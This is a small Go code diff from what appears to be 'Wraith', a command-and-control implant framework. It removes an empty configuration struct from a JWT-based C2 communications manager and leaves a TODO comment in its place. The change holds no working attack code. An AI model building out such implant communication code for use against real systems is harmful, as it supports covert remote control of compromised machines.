@@ -8,12 +8,6 @@ import (
 	"git.0x1a8510f2.space/0x1a8510f2/wraith/libwraith"
 )
 
-// A struct to store various configuration properties of the DefaultJWTCommsManager.
-// Not all CommsManagers have this, but it helps for more general-purpose managers
-// like this one, to tweak behaviour.
-type DefaultJWTCommsManagerConfig struct {
-}
-
 // A CommsManager module implementation which utilises (optionally) encrypted JWT
 // as a base for its transfer protocol. This allows messages to be signed and
 // verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
@@ -25,8 +19,8 @@ type DefaultJWTCommsManager struct {
 	running      bool
 	runningMutex sync.Mutex
 
-	// A property used to configure various behaviours of this CommsManager.
-	Conf DefaultJWTCommsManagerConfig
+	// Configuration properties
+	// TODO
 }
 
 // Spawn a channel which is triggered when the m.running condition is false
